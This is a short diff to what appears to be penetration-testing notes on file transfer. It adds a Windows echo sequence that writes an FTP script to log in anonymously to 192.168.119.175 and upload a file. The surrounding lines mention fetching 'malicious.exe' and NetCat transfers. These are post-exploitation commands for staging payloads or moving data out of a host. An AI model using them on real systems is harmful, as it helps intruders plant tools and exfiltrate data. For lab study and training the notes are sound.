@@ -160,6 +160,15 @@ ftp> get malicious.exe
 ftp> bye
 ```
 
+```
+echo open 192.168.119.175 21> ftp.txt
+echo USER anonymous>> ftp.txt
+echo.>> ftp.txt
+echo bin >> ftp.txt
+echo PUT x >> ftp.txt
+echo bye >> ftp.txt
+```
+
 # NetCat File Transfer:
 nc is basically a built-in tool from any UNIX-like systems (even embedded systems), so it's perfect for "quick and temporary way to transfer files".
 open a listen on port 12345, waiting for data.
